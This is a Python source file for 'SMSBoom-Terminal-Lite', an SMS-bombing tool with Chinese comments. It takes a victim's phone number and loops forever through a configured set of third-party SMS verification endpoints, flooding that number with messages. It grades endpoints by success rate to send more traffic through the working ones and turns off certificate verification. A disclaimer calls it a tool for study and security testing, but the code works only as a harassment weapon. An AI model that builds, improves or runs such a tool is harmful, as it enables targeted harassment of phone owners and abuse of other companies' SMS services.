"""
SMSBoom-Terminal-Lite 重构版 - 抽象化设计
采用面向对象和配置驱动的设计模式
"""

import requests
import time
import random
import sys
import os
import json
from colorama import init, Fore, Style
from urllib.parse import quote
import urllib3
from typing import Dict, List, Optional, Callable, Tuple
from dataclasses import dataclass, field
from enum import Enum
import logging
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path

# 初始化
init(autoreset=True)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# 配置日志 - 只写入文件,不输出到控制台(避免干扰进度条)
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('smsboom.log', encoding='utf-8')
    ]
)
logger = logging.getLogger(__name__)
HEALTH_CACHE_FILE = 'interface_health_cache.json'


class RequestMethod(Enum):
    """HTTP请求方法枚举"""
    GET = "GET"
    POST = "POST"
    PUT = "PUT"
    DELETE = "DELETE"


class ContentType(Enum):
    """内容类型枚举"""
    JSON = "application/json"
    FORM = "application/x-www-form-urlencoded"
    TEXT = "text/plain"


@dataclass
class SMSInterface:
    """短信接口配置类"""
    name: str                          # 接口名称
    url: str                          # 请求URL
    method: RequestMethod = RequestMethod.POST  # 请求方法
    headers: Dict[str, str] = field(default_factory=dict)  # 请求头
    params: Dict[str, str] = field(default_factory=dict)   # URL参数
    data_template: Optional[str] = None  # 数据模板（支持{phone}占位符）
    content_type: ContentType = ContentType.JSON  # 内容类型
    timeout: int = 5                  # 超时时间
    enabled: bool = True              # 是否启用
    weight: int = 1                   # 权重（调用次数）
    
    def build_request(self, phone: str) -> Dict:
        """构建请求参数"""
        # 安全地格式化URL,处理可能包含的JSON花括号
        url = self.url
        if '{phone}' in self.url:
            try:
                url = self.url.format(phone=phone)
            except (KeyError, ValueError):
                # 如果格式化失败,尝试转义其他花括号
                escaped_url = self.url.replace('{{', '{{{{').replace('}}', '}}}}')
                try:
                    url = escaped_url.format(phone=phone)
                except (KeyError, ValueError):
                    url = self.url
        
        request_config = {
            'url': url,
            'headers': self.headers.copy(),
            'timeout': self.timeout,
            'verify': False
        }
        
        # 处理URL参数
        if self.params:
            params = {}
            for k, v in self.params.items():
                if isinstance(v, str) and '{phone}' in v:
                    try:
                        params[k] = v.format(phone=phone)
                    except (KeyError, ValueError):
                        params[k] = v
                else:
                    params[k] = v
            request_config['params'] = params
        
        # 处理请求体
        if self.data_template:
            data_str = self.data_template.replace('{phone}', phone)

            if self.content_type == ContentType.JSON:
                # 尝试归一化模板格式（处理 ""{{...}}"" 和 {{...}} 格式）
                normalized = data_str.strip()
                if normalized.startswith('""') and normalized.endswith('""'):
                    normalized = normalized[2:-2].replace('{{', '{').replace('}}', '}')
                elif normalized.startswith('{{') and normalized.endswith('}}'):
                    normalized = normalized.replace('{{', '{').replace('}}', '}')
                try:
                    request_config['json'] = json.loads(normalized)
                except json.JSONDecodeError as e:
                    # 回退：尝试解析原始替换结果
                    try:
                        request_config['json'] = json.loads(data_str)
                    except json.JSONDecodeError:
                        logger.debug(f"{self.name} JSON解析失败: {e}")
                        request_config['data'] = data_str
            elif self.content_type == ContentType.FORM:
                request_config['data'] = data_str
            else:
                request_config['data'] = data_str
        
        return request_config
    
    def send(self, phone: str) -> bool:
        """发送短信请求"""
        try:
            config = self.build_request(phone)
            method_func = getattr(requests, self.method.value.lower())
            response = method_func(**config)

            success = response.status_code in [200, 201, 204]
            logger.debug(f"{self.name}: {response.status_code}")
            return success

        except requests.RequestException as e:
            logger.error(f"{self.name} 请求失败: {e}")
            return False


class InterfaceGrade(Enum):
    """接口等级枚举"""
    A = "A"  # 优秀: 成功率 >= 70%
    B = "B"  # 良好: 成功率 >= 40%
    C = "C"  # 一般: 成功率 >= 15%
    D = "D"  # 差: 成功率 < 15%


@dataclass
class HealthStatus:
    """接口健康状态"""
    name: str
    success_count: int = 0
    fail_count: int = 0
    structurally_valid: bool = True   # 结构是否有效
    last_success: bool = True         # 最近一次是否成功
    consecutive_fails: int = 0        # 连续失败次数
    grade: InterfaceGrade = InterfaceGrade.B
    dynamic_weight: float = 1.0       # 动态权重乘数

    @property
    def total_count(self) -> int:
        return self.success_count + self.fail_count

    @property
    def success_rate(self) -> float:
        return (self.success_count / self.total_count * 100) if self.total_count > 0 else 0.0


class InterfaceHealthManager:
    """接口健康管理器 - 探活、评级、动态调度、持久化"""

    GRADE_WEIGHTS = {
        InterfaceGrade.A: 3.0,
        InterfaceGrade.B: 1.5,
        InterfaceGrade.C: 0.5,
        InterfaceGrade.D: 0.0,   # D 级自动禁用
    }

    GRADE_COLORS = {
        InterfaceGrade.A: Fore.GREEN,
        InterfaceGrade.B: Fore.CYAN,
        InterfaceGrade.C: Fore.YELLOW,
        InterfaceGrade.D: Fore.RED,
    }

    def __init__(self):
        self.health_data: Dict[str, HealthStatus] = {}
        self._load_cache()

    # ---------- 持久化 ----------

    def _load_cache(self):
        """从缓存文件加载健康数据"""
        cache_path = Path(HEALTH_CACHE_FILE)
        if not cache_path.exists():
            logger.info("未找到健康缓存，将使用初始状态")
            return
        try:
            with open(cache_path, 'r', encoding='utf-8') as f:
                data = json.load(f)
            for name, info in data.get('interfaces', {}).items():
                status = HealthStatus(
                    name=name,
                    success_count=info.get('success_count', 0),
                    fail_count=info.get('fail_count', 0),
                    structurally_valid=info.get('structurally_valid', True),
                    last_success=info.get('last_success', True),
                    consecutive_fails=info.get('consecutive_fails', 0),
                )
                self._recalculate_grade(status)
                self.health_data[name] = status
            logger.info(f"从缓存加载了 {len(self.health_data)} 个接口的健康数据")
        except (json.JSONDecodeError, IOError) as e:
            logger.warning(f"加载健康缓存失败: {e}")
            self.health_data = {}

    def save_cache(self):
        """保存健康数据到缓存文件"""
        data = {
            'last_updated': time.strftime('%Y-%m-%d %H:%M:%S'),
            'total_interfaces': len(self.health_data),
            'interfaces': {}
        }
        for name, status in self.health_data.items():
            data['interfaces'][name] = {
                'success_count': status.success_count,
                'fail_count': status.fail_count,
                'success_rate': round(status.success_rate, 1),
                'grade': status.grade.value,
                'structurally_valid': status.structurally_valid,
                'last_success': status.last_success,
                'consecutive_fails': status.consecutive_fails,
                'dynamic_weight': round(status.dynamic_weight, 2),
            }
        try:
            with open(HEALTH_CACHE_FILE, 'w', encoding='utf-8') as f:
                json.dump(data, f, ensure_ascii=False, indent=2)
            logger.info(f"健康数据已保存到 {HEALTH_CACHE_FILE}")
        except IOError as e:
            logger.error(f"保存健康缓存失败: {e}")

    # ---------- 评级 ----------

    def _get_or_create(self, name: str) -> HealthStatus:
        """获取或创建接口健康状态"""
        if name not in self.health_data:
            self.health_data[name] = HealthStatus(name=name)
        return self.health_data[name]

    @staticmethod
    def _recalculate_grade(status: HealthStatus):
        """根据成功率重新计算等级和动态权重"""
        if not status.structurally_valid:
            status.grade = InterfaceGrade.D
            status.dynamic_weight = 0.0
            return
        rate = status.success_rate
        if status.total_count == 0:
            status.grade = InterfaceGrade.B
            status.dynamic_weight = InterfaceHealthManager.GRADE_WEIGHTS[InterfaceGrade.B]
            return
        if rate >= 70:
            status.grade = InterfaceGrade.A
        elif rate >= 40:
            status.grade = InterfaceGrade.B
        elif rate >= 15:
            status.grade = InterfaceGrade.C
        else:
            status.grade = InterfaceGrade.D
        status.dynamic_weight = InterfaceHealthManager.GRADE_WEIGHTS[status.grade]

    # ---------- 智能权重 ----------

    def get_smart_weighted_tasks(self, interfaces: List[SMSInterface]) -> List[SMSInterface]:
        """获取智能权重任务列表（结合配置权重和健康权重）"""
        tasks = []
        for iface in interfaces:
            if not iface.enabled:
                continue
            status = self._get_or_create(iface.name)
            # 结构无效的接口跳过
            if not status.structurally_valid:
                continue
            # 计算有效权重: 配置权重 * 动态健康权重
            effective_weight = max(1, int(iface.weight * status.dynamic_weight))
            tasks.extend([iface] * effective_weight)
        return tasks

    # ---------- 探活 ----------

    @staticmethod
    def _normalize_json_template(tmpl: str) -> str:
        """将各种 JSON 模板格式归一化为可解析的 JSON 字符串"""
        s = tmpl.strip()
        # 1. ""{{...}}""  →  {...}   (双引号包裹 + 双花括号转义)
        if s.startswith('""') and s.endswith('""'):
            s = s[2:-2]
            s = s.replace('{{', '{').replace('}}', '}')
        # 2. {{...}}  →  {...}        (仅双花括号转义)
        elif s.startswith('{{') and s.endswith('}}'):
            s = s.replace('{{', '{').replace('}}', '}')
        return s

    @staticmethod
    def _check_interface_structure(iface: SMSInterface) -> Tuple[bool, str]:
        """检查接口结构有效性（不发网络请求）"""
        # 1. URL 检查
        if not iface.url or not iface.url.startswith(('http://', 'https://')):
            return False, "URL无效"

        # 2. 数据模板检查
        if iface.data_template:
            tmpl = iface.data_template.strip()

            # JSON 内容类型检查
            if iface.content_type == ContentType.JSON:
                # 归一化模板格式后替换占位符
                normalized = InterfaceHealthManager._normalize_json_template(tmpl)
                test_data = normalized.replace('{phone}', '13800138000')
                try:
                    json.loads(test_data)
                except json.JSONDecodeError:
                    return False, f"JSON模板无效: {tmpl[:40]}"

            # 表单编码检查
            elif iface.content_type == ContentType.FORM:
                if not tmpl or tmpl in ['{', ',', '{phone}']:
                    return False, f"表单模板无效: {tmpl[:40]}"

            # 通用内容检查
            else:
                if len(tmpl) <= 1 and tmpl in ['{', ',', '[', '']:
                    return False, "数据模板内容不足"

        # 3. 无模板的 GET 请求，URL 里应包含 phone 占位符
        if not iface.data_template and '{phone}' not in iface.url:
            if not iface.params:
                return False, "无数据模板且URL无phone参数"

        return True, "OK"

    def run_health_probe(self, interfaces: List[SMSInterface]) -> Dict[str, bool]:
        """运行接口健康探活（结构检查 + 缓存加载）"""
        enabled = [iface for iface in interfaces if iface.enabled]
        total = len(enabled)
        print(f"\n{Fore.CYAN}{'='*50}")
        print(f"{Fore.YELLOW}🔍 接口健康探活  ({total} 个启用接口){Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*50}{Style.RESET_ALL}")

        # 显示缓存加载信息
        if self.health_data:
            valid_cached = sum(1 for s in self.health_data.values() if s.structurally_valid)
            print(f"{Fore.CYAN}📂 已加载历史健康数据: {valid_cached}/{len(self.health_data)} 个接口{Style.RESET_ALL}")

        passed, failed = 0, 0
        for iface in enabled:
            valid, msg = self._check_interface_structure(iface)
            status = self._get_or_create(iface.name)
            status.structurally_valid = valid
            self._recalculate_grade(status)

            if valid:
                passed += 1
                grade_color = self.GRADE_COLORS.get(status.grade, Fore.WHITE)
                print(f"  {Fore.GREEN}✓{Style.RESET_ALL} {iface.name:<25} {grade_color}[{status.grade.value}]{Style.RESET_ALL}")
            else:
                failed += 1
                print(f"  {Fore.RED}✗{Style.RESET_ALL} {iface.name:<25} {Fore.RED}{msg}{Style.RESET_ALL}")

        # 汇总
        print(f"\n{Fore.CYAN}{'─'*50}")
        print(f"{Fore.GREEN}✓ 通过: {passed}{Style.RESET_ALL}  "
              f"{Fore.RED}✗ 未通过: {failed}{Style.RESET_ALL}  "
              f"成功率: {(passed/total*100):.1f}%")
        if failed > 0:
            print(f"{Fore.YELLOW}⚠️  未通过的接口将被自动跳过{Style.RESET_ALL}")
        print()

        self.save_cache()
        return {iface.name: self._get_or_create(iface.name).structurally_valid for iface in enabled}

    # ---------- 运行时记录 ----------

    def record_result(self, iface_name: str, success: bool):
        """记录单次请求结果"""
        status = self._get_or_create(iface_name)
        if success:
            status.success_count += 1
            status.consecutive_fails = 0
            status.last_success = True
        else:
            status.fail_count += 1
            status.consecutive_fails += 1
            status.last_success = False
        self._recalculate_grade(status)

    def update_after_round(self, results: List[Tuple[str, bool]]):
        """每轮结束后批量更新并持久化"""
        for name, success in results:
            self.record_result(name, success)
        self.save_cache()

    # ---------- 报告 ----------

    def print_health_report(self):
        """打印接口健康报告"""
        if not self.health_data:
            print(f"{Fore.YELLOW}暂无健康数据{Style.RESET_ALL}")
            return

        grade_counts = {g: 0 for g in InterfaceGrade}
        for status in self.health_data.values():
            grade_counts[status.grade] += 1

        print(f"\n{Fore.CYAN}{'─'*50}")
        print(f"{Fore.YELLOW}📊 接口健康报告{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'─'*50}")
        for grade in InterfaceGrade:
            count = grade_counts[grade]
            color = self.GRADE_COLORS[grade]
            print(f"  {color}[{grade.value}]{Style.RESET_ALL} {count} 个")

        # 按成功率排序展示所有接口
        sorted_items = sorted(self.health_data.values(), key=lambda s: s.success_rate, reverse=True)
        print(f"\n  {'接口名称':<25} {'等级':^5} {'成功率':^8} {'成功/总数'}")
        for status in sorted_items:
            color = self.GRADE_COLORS.get(status.grade, Fore.WHITE)
            valid_mark = "" if status.structurally_valid else f" {Fore.RED}[无效]{Style.RESET_ALL}"
            print(f"  {status.name:<25} {color}[{status.grade.value}]{Style.RESET_ALL} "
                  f"{status.success_rate:>5.1f}%   "
                  f"{status.success_count}/{status.total_count}{valid_mark}")
        print()


class InterfaceManager:
    """接口管理器 - 统一管理所有短信接口"""
    
    def __init__(self, health_manager: Optional['InterfaceHealthManager'] = None):
        self.interfaces: List[SMSInterface] = []
        self.health_manager = health_manager
        self._load_interfaces()
    
    def _load_interfaces(self):
        """加载所有接口配置 - 完全从外部文件加载"""
        # 尝试从配置文件加载
        config_files = ['interfaces_complete.json']
        
        loaded = False
        for config_file in config_files:
            if os.path.exists(config_file):
                try:
                    self.load_from_config(config_file)
                    logger.info(f"✅ 从 {config_file} 加载了 {len(self.interfaces)} 个接口")
                    loaded = True
                    break
                except Exception as e:
                    logger.warning(f"⚠️  加载 {config_file} 失败: {e}")
        
        # 如果没有配置文件，使用默认的最小接口集（仅用于测试）
        if not loaded:
            logger.warning("⚠️  未找到配置文件，使用默认测试接口")
            self._load_default_interfaces()
    
    def _load_default_interfaces(self):
        """加载默认的最小接口集（仅用于测试）"""
        self.interfaces.extend([
            SMSInterface(
                name="测试接口1",
                url="https://httpbin.org/post",
                headers={"Content-Type": "application/json"},
                data_template='{"phone":"{phone}"}',
                enabled=False  # 默认禁用，需要用户配置真实接口
            )
        ])
    
    def get_enabled_interfaces(self) -> List[SMSInterface]:
        """获取所有启用的接口"""
        return [iface for iface in self.interfaces if iface.enabled]
    
    def get_weighted_tasks(self) -> List[SMSInterface]:
        """获取带权重的任务列表（智能调度优先）"""
        if self.health_manager:
            return self.health_manager.get_smart_weighted_tasks(self.interfaces)
        tasks = []
        for iface in self.get_enabled_interfaces():
            tasks.extend([iface] * iface.weight)
        return tasks
    
    def add_interface(self, interface: SMSInterface):
        """动态添加接口"""
        self.interfaces.append(interface)
        logger.info(f"添加接口: {interface.name}")
    
    def disable_interface(self, name: str):
        """禁用指定接口"""
        for iface in self.interfaces:
            if iface.name == name:
                iface.enabled = False
                logger.info(f"禁用接口: {name}")
                break
    
    def load_from_config(self, config_file: str):
        """从配置文件加载接口"""
        try:
            with open(config_file, 'r', encoding='utf-8') as f:
                config = json.load(f)
            
            for iface_config in config.get('interfaces', []):
                interface = SMSInterface(
                    name=iface_config['name'],
                    url=iface_config['url'],
                    method=RequestMethod(iface_config.get('method', 'POST')),
                    headers=iface_config.get('headers', {}),
                    params=iface_config.get('params', {}),
                    data_template=iface_config.get('data_template'),
                    content_type=ContentType(iface_config.get('content_type', 'application/json')),
                    timeout=iface_config.get('timeout', 5),
                    enabled=iface_config.get('enabled', True),
                    weight=iface_config.get('weight', 1)
                )
                self.interfaces.append(interface)
            
            logger.info(f"从配置文件加载了 {len(config['interfaces'])} 个接口")
        except Exception as e:
            logger.error(f"加载配置文件失败: {e}")


class ProgressTracker:
    """进度追踪器"""
    
    def __init__(self, total: int):
        self.total = total
        self.current = 0
        self.success = 0
        self.failed = 0
        self.progress_width = 30
    
    def update(self, success: bool):
        """更新进度"""
        self.current += 1
        if success:
            self.success += 1
        else:
            self.failed += 1
    
    def display(self):
        """显示进度条 - 原地更新不换行"""
        percent = int((self.current / self.total) * 100) if self.total > 0 else 0
        progress = int((self.current / self.total) * self.progress_width) if self.total > 0 else 0
        
        bar = f"{Fore.GREEN}{'█' * progress}{Fore.RED}{'░' * (self.progress_width - progress)}{Style.RESET_ALL}"
        
        # 使用 \r 回到行首，\033[K 清除到行尾的内容，避免残留字符
        sys.stdout.write(f"\r\033[K{Fore.CYAN}[{bar}] {percent}% | "
                        f"成功: {Fore.GREEN}{self.success}{Style.RESET_ALL} | "
                        f"失败: {Fore.RED}{self.failed}{Style.RESET_ALL} | "
                        f"任务: {self.current}/{self.total}")
        sys.stdout.flush()
    
    def reset(self):
        """重置进度"""
        self.current = 0
        self.success = 0
        self.failed = 0


class UIController:
    """用户界面控制器"""
    
    @staticmethod
    def print_logo():
        """打印Logo"""
        logo = f"""
{Fore.BLUE}+-----------------------------------+
{Fore.CYAN}|     SMSBoom Terminal Lite v2.0    |
{Fore.BLUE}+-----------------------------------+
{Fore.YELLOW}      抽象化重构版 - 更安全高效
{Style.RESET_ALL}
"""
        print(logo)
    
    @staticmethod
    def show_disclaimer():
        """显示免责声明"""
        text = (
            "⚠️  免责声明：本工具仅用于学习交流和安全测试\n"
            "请确保使用符合当地法律法规\n"
            "任何滥用行为导致的后果由使用者自行承担\n"
            "感谢上一个项目的作者：https://github.com/MallocPointer/SMSBoom-Terminal"
        )
        print(f"\n{Fore.RED}{Style.BRIGHT}{text}{Style.RESET_ALL}\n")
    
    @staticmethod
    def typewriter(text: str, color=Fore.WHITE, delay: float = 0.02):
        """打字机效果"""
        for char in text:
            sys.stdout.write(f"{color}{char}{Style.RESET_ALL}")
            sys.stdout.flush()
            time.sleep(delay)
        print()
    
    @staticmethod
    def clear_screen():
        """清屏"""
        os.system('cls' if os.name == 'nt' else 'clear')
    
    @staticmethod
    def get_phone_input() -> Optional[str]:
        """获取手机号输入"""
        while True:
            phone = input(f"{Fore.CYAN}请输入目标手机号 (输入q退出): {Style.RESET_ALL}")
            
            if phone.lower() == 'q':
                return None
            
            if len(phone) == 11 and phone.isdigit():
                return phone
            
            print(f"{Fore.RED}✗ 请输入11位有效手机号{Style.RESET_ALL}")
    
    @staticmethod
    def confirm_action(target: str) -> bool:
        """确认操作"""
        confirm = input(f"{Fore.YELLOW}即将开始操作，目标: {target}\n确认执行？(y/n): {Style.RESET_ALL}")
        return confirm.lower() == 'y'


class SMSBoomEngine:
    """短信轰炸引擎 - 核心业务逻辑"""
    
    def __init__(self):
        self.health_manager = InterfaceHealthManager()
        self.interface_manager = InterfaceManager(health_manager=self.health_manager)
        self.ui = UIController()
        self.is_running = False
    
    def start(self):
        """启动程序"""
        try:
            self.ui.clear_screen()
            self.ui.print_logo()
            self.ui.show_disclaimer()
            
            # 获取手机号
            phone = self.ui.get_phone_input()
            if not phone:
                print(f"{Fore.YELLOW}程序已退出{Style.RESET_ALL}")
                return
            
            # 确认操作
            if not self.ui.confirm_action(phone):
                print(f"{Fore.RED}操作已取消{Style.RESET_ALL}")
                return
            
            # 开始执行
            self._execute_campaign(phone)
            
        except KeyboardInterrupt:
            self.health_manager.save_cache()
            print(f"\n\n{Fore.RED}⚠️  程序被用户中断（健康数据已保存）{Style.RESET_ALL}")
        except Exception as e:
            logger.error(f"程序异常: {e}")
            print(f"{Fore.RED}✗ 程序错误: {str(e)}{Style.RESET_ALL}")
    
    def _execute_campaign(self, phone: str):
        """执行短信发送活动"""
        cycle_count = 1

        # 启动前运行健康探活
        self.health_manager.run_health_probe(self.interface_manager.interfaces)
        input(f"{Fore.CYAN}按 Enter 开始执行...{Style.RESET_ALL}")

        while True:
            self.ui.clear_screen()
            self.ui.print_logo()

            # 显示状态
            print(f"{Fore.CYAN}{'='*50}")
            print(f"{Fore.MAGENTA}📱 目标号码: {phone[:3]}****{phone[7:]}")
            print(f"{Fore.MAGENTA}🔄 循环次数: {cycle_count}")
            print(f"{Fore.CYAN}{'='*50}{Style.RESET_ALL}\n")

            # 获取智能调度任务列表
            tasks = self.interface_manager.get_weighted_tasks()
            random.shuffle(tasks)

            if not tasks:
                print(f"{Fore.RED}⚠️  没有可用的接口任务！请检查接口配置和健康状态{Style.RESET_ALL}")
                input(f"{Fore.YELLOW}按 Enter 退出...{Style.RESET_ALL}")
                return

            # 创建进度追踪器
            tracker = ProgressTracker(len(tasks))
            round_results: List[Tuple[str, bool]] = []

            start_time = time.time()

            # 执行任务
            for task in tasks:
                success = task.send(phone)
                tracker.update(success)
                tracker.display()
                round_results.append((task.name, success))

                # 小延迟避免过快请求
                time.sleep(0.05)

            # 本轮完成
            elapsed = time.time() - start_time
            print(f"\n\n{Fore.CYAN}✓ 本轮完成")
            print(f"{Fore.CYAN}⏱️  耗时: {Fore.YELLOW}{elapsed:.2f}秒")
            print(f"{Fore.CYAN}📊 成功率: {Fore.GREEN}{(tracker.success/tracker.total*100):.1f}%")

            # 更新健康数据并打印报告
            self.health_manager.update_after_round(round_results)
            self.health_manager.print_health_report()

            print(f"{Fore.CYAN}即将开始下一轮...{Style.RESET_ALL}")

            # 倒计时
            for i in range(5, 0, -1):
                sys.stdout.write(f"\r{Fore.YELLOW}⏳ 等待: {i}秒{Style.RESET_ALL} ")
                sys.stdout.flush()
                time.sleep(1)

            cycle_count += 1
    
    def add_custom_interface(self, config: Dict):
        """添加自定义接口"""
        interface = SMSInterface(
            name=config['name'],
            url=config['url'],
            method=RequestMethod(config.get('method', 'POST')),
            headers=config.get('headers', {}),
            data_template=config.get('data_template'),
            timeout=config.get('timeout', 5)
        )
        self.interface_manager.add_interface(interface)


def main():
    """主函数"""
    engine = SMSBoomEngine()
    engine.start()


if __name__ == "__main__":
    main()
